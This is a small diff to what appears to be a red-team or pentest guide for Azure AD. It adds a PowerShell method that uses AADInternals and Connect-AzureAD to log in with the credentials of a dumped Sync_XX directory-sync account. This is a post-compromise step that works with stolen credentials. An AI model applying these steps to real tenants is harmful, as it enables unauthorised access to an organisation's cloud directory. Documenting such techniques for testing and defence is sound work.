@@ -30,6 +30,12 @@ Login using dumped Sync_XX account:
 # Enter your dumped Sync_XX account creds!
 $tenantId = "YOUR_TENANT_ID"
 $at = Get-AADIntAccessTokenForAADGraph -SaveToCache
+
+# method 1: 
+$userUPN = "Sync_xxx@YOURDOMAIN.onmicrosoft.com" # change the username
+Connect-AzureAD -AccountId  $userUPN  -TenantId $tenantId -AadAccessToken $at
+
+# method 2:
 Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id,
 ```
 
